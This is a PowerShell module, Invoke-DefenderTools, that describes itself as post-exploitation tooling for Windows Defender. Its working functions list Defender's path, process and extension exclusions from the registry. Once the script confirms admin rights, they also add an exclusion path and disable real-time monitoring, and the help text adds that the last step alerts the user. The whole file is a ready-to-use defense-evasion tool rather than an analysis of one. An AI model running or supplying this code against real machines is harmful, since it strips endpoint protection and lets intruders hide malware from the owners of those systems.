function Invoke-DefenderTools {
<#
                                          
.SYNOPSIS

Several functions to interact with Windows Defender for post-exploitation.

.PARAMETER help

Shows detailed help for each function.

.PARAMETER list

Shows summary list of available functions.

.PARAMETER GetExcludes

Returns any currently configured files/paths/extensions/process excludes.

.PARAMETER AddExclude

Adds a path exclude.

.PARAMETER DisableRtm

Disables Real-Time Monitoring

.EXAMPLE

PS> . .\Invoke-DefenderTools

or

PS> Import-Module Invoke-DefenderTools

Functions:

PS> Invoke-DefenderTools -GetExcludes
PS> Invoke-DefenderTools -AddExclude -Path C:\windows\temp
PS> Invoke-DefenderTools -DisableRtm

#>
[CmdletBinding()]
param (
	[Switch]$Help,
	[Switch]$List,
	[Switch]$GetExcludes,
	[Switch]$AddExclude,
	[string]$Path,
	[Switch]$DisableRtm
)

	if ($Help -eq $True) {
		Write @"
		
 ### HELP ###
 ---------------------
 
 Invoke-DefenderTools [-command] [-parameter(s)]
 Invoke-DefenderTools [-list]
 
 Available Invoke-DefenderTools Commands:
 ----------------------------------------
 /----------------------------------------------------------------------/
 | -GetExcludes                                                         |
 | -------------------------------------------------------------------- |
 |                                                                      |
 |  [*] Description: Gets any current exclude files/paths/extensions    |
 |      currently configured in Windows Defender via the Registry.      |
 |                                                                      |
 |  [*] Usage: Invoke-DefenderTools -GetExcludes                        |
 /----------------------------------------------------------------------/
	   
 /----------------------------------------------------------------------/
 | -AddExclude [-Path] path                                             |
 | -------------------------------------------------------------------- |
 |                                                                      |
 |  [*] Description: Adds a path exclude to Windows Defender.           |
 |      (Requires Elevation)                                            |
 |                                                                      |
 |  [*] Usage: Invoke-DefenderTools -AddExclude -Path C:\temp           |
 /----------------------------------------------------------------------/
	  
 /----------------------------------------------------------------------/
 | -DisableRTM                                                          |
 | -------------------------------------------------------------------- |
 |                                                                      |
 |  [*] Description: Disables Windows Defender Real-Time Monitoring.    |
 |      (Requires Elevation)                                            |
 |                                                                      |
 |      Note: Will pop an alert to the end user.                        |
 |                                                                      |
 |  [*] Usage: Invoke-DefenderTools -DisableRtm                         |
 /----------------------------------------------------------------------/

"@
	}
	elseif ($List -eq $True) {
		Write @"

 DEFENDER Command List:
 ----------------------
 defender -GetExcludes
 defender -AddExclude [-Path] path
 defender -DisableRtm
 
"@
	}
		
	elseif ($GetExcludes) {
		
		$h = "`n### Invoke-DefenderTools(GetExcludes) ###`n"
		$h
		Write "`nPATHS/FILE EXCLUSIONS"
		Write "---------------------"
		$RegKey = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths')
		$RegKey.PSObject.Properties | ForEach-Object {
			If($_.Name -like '*:\*'){
				Write $_.Name
			}
		}
		Write "`nPROCESS EXCLUSIONS"
		Write "------------------"
		$RegKey = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes')
		$RegKey.PSObject.Properties | ForEach-Object {
			If($_.Name -like '*.*'){
				Write $_.Name
			}
		}
		Write "`nEXTENSION EXCLUSIONS"
		Write "--------------------"
		$RegKey = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions')
		$RegKey.PSObject.Properties | ForEach-Object {
			If($_.Name -like '*.*'){
				Write $_.Name
			}
		}
		$h
	}	
	elseif ($AddExclude -and $Path) {
		$h = "`n### Invoke-DefenderTools(AddExclude) ###`n"
		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
		
		if ($CheckElevated -eq $true) {
			$h
			Add-MpPreference -ExclusionPath "$path"
			Write " [+] Looks like we're running as admin, added a Defender exclude path of '$path'!"
			$h
		}
		else {
			$h
			Write " [!] Not Admin. Must be admin or running as a high-integrity process to add a Defender exclude."
			$h
		}
	}
	elseif ($DisableRtm) {
		$h = "`n### Invoke-DefenderTools(DisableRtm) ###`n"
		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
		
		if ($CheckElevated -eq $true) {
			$h
			Set-MpPreference -DisableRealTimeMonitoring $true
			Write " [+] Successfully disabled Defender's real-time monitoring."
			$h
		}
		else {
			$h
			Write " [!] Not Admin. Must be admin or running as a high-integrity process to disable Defender's Real-Time Monitoring."
			$h
		}
	}
}
